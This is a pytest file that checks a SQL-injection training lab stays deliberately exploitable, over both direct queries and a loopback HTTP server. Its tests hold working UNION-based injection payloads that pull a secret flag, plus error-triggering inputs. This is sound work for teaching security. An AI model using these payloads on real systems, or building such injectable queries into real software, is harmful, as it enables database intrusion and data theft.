"""Regression tests proving the SQLi training lab stays exploitable."""

import importlib.util
import sys
import urllib.error
import urllib.parse
import urllib.request
from collections.abc import Iterator
from http.server import ThreadingHTTPServer
from pathlib import Path
from threading import Thread
from types import ModuleType

import pytest

_LAB_APP = Path(__file__).resolve().parents[2] / "labs" / "sqli" / "app.py"


def _load_lab_module() -> ModuleType:
    spec = importlib.util.spec_from_file_location("lab_sqli_app", _LAB_APP)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


lab = _load_lab_module()


def test_normal_lookup_returns_only_the_requested_product() -> None:
    connection = lab.build_connection()
    rows = lab.product_query(connection, "1")
    assert rows == [(1, "Training Widget", "9.99")]


def test_union_injection_recovers_the_flag() -> None:
    connection = lab.build_connection()
    rows = lab.product_query(connection, "0 UNION SELECT 1, flag, 3 FROM secrets")
    assert any(lab.FLAG in str(row[1]) for row in rows)


def test_malformed_injection_raises_a_database_error() -> None:
    connection = lab.build_connection()
    with pytest.raises(Exception):  # noqa: B017 - error-based signal is the point
        lab.product_query(connection, "1 UNION SELECT")


@pytest.fixture
def lab_base_url() -> Iterator[str]:
    """Run the real ``LabHandler`` over a socket so the full HTTP path is tested.

    Exercising the handler (not just ``product_query``) guards against attribute
    collisions with ``BaseHTTPRequestHandler`` internals such as ``connection``,
    which is the client socket rather than the training database.
    """

    lab.LabHandler.db_connection = lab.build_connection()
    server = ThreadingHTTPServer(("127.0.0.1", 0), lab.LabHandler)
    thread = Thread(target=server.serve_forever, daemon=True)
    thread.start()
    host, port = server.server_address
    try:
        yield f"http://{host}:{port}"
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def _get(base_url: str, id_param: str) -> tuple[int, str]:
    url = f"{base_url}/products?" + urllib.parse.urlencode({"id": id_param})
    try:
        with urllib.request.urlopen(url, timeout=5) as response:  # noqa: S310 - loopback test server
            return response.status, response.read().decode()
    except urllib.error.HTTPError as error:
        return error.code, error.read().decode()


def test_http_normal_lookup_returns_the_product(lab_base_url: str) -> None:
    status, body = _get(lab_base_url, "1")
    assert status == 200
    assert "Training Widget" in body


def test_http_union_injection_leaks_the_flag(lab_base_url: str) -> None:
    status, body = _get(lab_base_url, "0 UNION SELECT 1, flag, 3 FROM secrets")
    assert status == 200
    assert lab.FLAG in body


def test_http_malformed_injection_reflects_a_sql_error(lab_base_url: str) -> None:
    status, body = _get(lab_base_url, "1'")
    assert status == 500
    assert "SQL error" in body
